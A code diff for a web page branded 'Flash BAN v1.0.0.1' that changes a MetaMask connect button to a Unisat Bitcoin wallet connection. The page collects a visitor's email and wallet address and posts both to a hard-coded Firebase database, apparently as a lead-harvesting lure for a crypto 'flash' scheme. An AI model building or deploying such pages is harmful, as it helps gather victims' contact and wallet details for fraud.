@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MetaMask Interaction</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.4.6/dist/ethers.umd.min.js"></script> <!-- Ethers.js library -->
+    <title>Bitcoin Wallet Connection</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -59,16 +58,14 @@
 </head>
 <body>
     <div class="container">
-        <h1>Flash BAN v1.0.0.1 connection with MetaMask</h1>
+        <h1>Flash BAN v1.0.0.1 connection to DEFI Wallet</h1>
         <input type="email" id="emailInput" placeholder="Enter your email" required style="padding: 10px; margin-bottom: 10px; width: 100%; border-radius: 5px;">
-        <button id="connectButton">Connect to MetaMask</button>
+        <button id="connectButton">CONNECT NOW</button>
         <div id="walletAddress"></div>
         <div id="statusMessage"></div>
     </div>
     
     <script>
-        let provider;
-        let signer;
         let connectedAddress = null;
         let isConnecting = false;
 
@@ -90,17 +87,15 @@
             document.getElementById('connectButton').textContent = 'Connecting...';
             document.getElementById('connectButton').style.backgroundColor = '#f0ad4e';
 
-            if (typeof window.ethereum !== 'undefined') {
+            if (window.unisat) {
                 try {
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
-                    signer = provider.getSigner();
-                    connectedAddress = await signer.getAddress();
-
+                    const accounts = await window.unisat.requestAccounts();
+                    connectedAddress = accounts[0];
+                    
                     document.getElementById('connectButton').textContent = 'Wallet Connected';
                     document.getElementById('connectButton').style.backgroundColor = '#28a745';
                     document.getElementById('walletAddress').textContent = `Connected Address: ${connectedAddress}`;
-
+                    
                     // Send data to Firebase
                     const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(connectedAddress)}.json`;
                     const jsonData = JSON.stringify({ email });
@@ -118,12 +113,12 @@
                     }
 
                 } catch (error) {
-                    document.getElementById('statusMessage').textContent = "MetaMask connection failed.";
-                    document.getElementById('connectButton').textContent = 'Connect to MetaMask';
+                    document.getElementById('statusMessage').textContent = "Bitcoin wallet connection failed.";
+                    document.getElementById('connectButton').textContent = 'Connect Wallet';
                     document.getElementById('connectButton').style.backgroundColor = '#f6851b';
                 }
             } else {
-                document.getElementById('statusMessage').textContent = "MetaMask is not installed!";
+                document.getElementById('statusMessage').textContent = "Unisat Wallet is not installed!";
             }
 
             isConnecting = false;
